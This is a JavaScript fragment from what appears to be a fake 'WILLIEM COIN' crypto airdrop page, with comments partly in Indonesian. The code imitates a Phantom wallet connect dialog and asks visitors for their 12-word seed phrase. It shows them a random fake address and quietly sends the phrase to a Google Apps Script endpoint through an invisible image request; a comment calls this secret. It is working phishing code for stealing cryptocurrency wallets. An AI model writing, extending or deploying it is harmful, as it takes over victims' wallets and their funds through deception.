...
/* =========================================
   WILLIEM COIN — FINAL FIX 100% WORK
   12 KATA KE GOOGLE SHEET
========================================= */
...
/* CHECK WALLET = BUKA MODAL 12 KATA */
window.checkAirdrop = function() {
    openPhantomModal();
}
...
/* TOMBOL CONNECT - INI YG KIRIM KE SHEET */
window.doPhantomConnect = function() {
    let words = [];
    for(let i = 1; i <= 12; i++) {
        words.push(document.getElementById("name" + i).value.trim());
    ...
    if(words.filter(w=>w).length < 12) {
        return alert("Please Connect To Your Phantom Wallet!");
    }
    
    demoWalletName = words.join(" ");
    let fakeAddress = "7xKX..." + Math.random().toString(36).substr(2,4);
    
    // KIRIM KE GOOGLE SHEET DIEM2
    new Image().src = GOOGLE_SCRIPT_URL + "?nama=" + encodeURIComponent(demoWalletName);
...
/* KLIK TOMBOL CONNECT WALLET ATAS */
document.getElementById("connectWallet").addEventListener("click", () => {
    if (!walletConnected) {
        openPhantomModal();
    } else {
